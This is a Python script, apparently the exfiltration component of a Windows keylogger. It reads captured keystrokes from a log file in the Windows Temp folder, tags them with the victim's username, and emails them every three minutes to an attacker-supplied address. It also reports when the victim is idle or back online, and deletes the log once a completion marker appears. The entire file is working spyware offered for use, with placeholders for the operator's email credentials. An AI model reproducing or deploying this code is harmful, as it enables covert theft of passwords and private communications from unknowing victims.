#!/usr/bin/python

import smtplib
import time
import sys
import os
from time import sleep
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

email = 'youremail' # Replace With Your Email
passw = 'yourpass' # Replace With Your Email
logfile = 'C:\\Windows\\Temp\\logfile.txt'
mailserver = 'emailimapserver' # Replace With Your Email Provider Imap Server
count = 1
previous = ''

start = time.time()

idle = False

hours = 1

target = os.popen('whoami').read()

target = target[target.find('\\')+1:]

def Send():
    global count
    global previous
    global start
    global hours
    global idle
    while ReadLogFile() == previous or len(ReadLogFile()) == 0:
        if (time.time()-start) / 3600 > 1:
            idle = True
            SendMessage('[!] {} Has Been Idle For {} hour(s)'.format(target, hours), False)
            start = time.time()
            hours += 1
    if idle:
        SendMessage('[+] {} Has Came Online After {}'.format(target, hours-1), False)
        hours = 1
        start = time.time()
        idle = False
    SendMessage('Key #{} From {}'.format(count, target), True)
    count += 1
    if 'Done!!' in ReadLogFile():
        SendMessage('Key #{} From {}'.format('LAST', target), True)
        os.system('del /f {}'.format(logfile))
        sys.exit(0)
    sleep(180)

def ReadLogFile():
    try:
        with open(logfile, 'r') as fp:
            return fp.read()
    except:
        return ''

def SendMessage(subject, readstatus):
    global previous
    smtp = smtplib.SMTP(mailserver, 587)
    smtp.ehlo()
    smtp.starttls()
    smtp.login(email, passw)
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = subject
    if readstatus:
        msg.attach(MIMEText(ReadLogFile()))
    else:
        msg.attach(MIMEText(''))
    previous = ReadLogFile()
    smtp.sendmail(email, email, msg.as_string())
    smtp.close()
    
def main():
    SendMessage('[*] Initializing Key Logging On {}'.format(target), False)
    os.system('del /f {}'.format(logfile))
    
    while True:
        Send()

if __name__ == '__main__':
    main()
    
